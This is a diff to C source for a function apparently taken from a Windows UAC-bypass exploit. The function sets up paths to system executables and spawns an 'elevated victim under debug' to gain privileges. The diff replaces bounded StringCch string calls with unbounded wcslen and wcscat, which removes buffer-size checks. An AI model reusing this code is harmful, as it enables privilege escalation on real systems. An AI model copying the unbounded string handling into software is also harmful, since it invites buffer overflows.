@@ -70,11 +70,10 @@ NTSTATUS ucmDebugObjectMethod(
 	CopyMemory(szSysRoot, szSysDir, 3 * sizeof(WCHAR));
 	szSysRoot[3] = L'\0';
 
-	size_t nResult;
-	StringCchLengthW(szSysDir, MAX_PATH, &nResult);
+	size_t nResult = wcslen(szSysDir);
 	WCHAR szProcess[MAX_PATH];
 	CopyMemory(szProcess, szSysDir, (nResult + 1) * sizeof(WCHAR));
-	StringCchCatW(szProcess, MAX_PATH, L"\\winver.exe");
+	wcscat(szProcess, L"\\winver.exe");
 
 	PROCESS_INFORMATION procInfo;
 	HANDLE dbgHandle = 0;
@@ -118,7 +117,7 @@ NTSTATUS ucmDebugObjectMethod(
 	// Spawn elevated victim under debug.
 	CopyMemory(szProcess, szSysDir, (nResult + 1) * sizeof(WCHAR));
 	CoTaskMemFree(szSysDir);
-	StringCchCatW(szProcess, MAX_PATH, L"\\taskmgr.exe");
+	wcscat(szProcess, L"\\taskmgr.exe");
 
 	RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
 	DEBUG_EVENT dbgEvent;
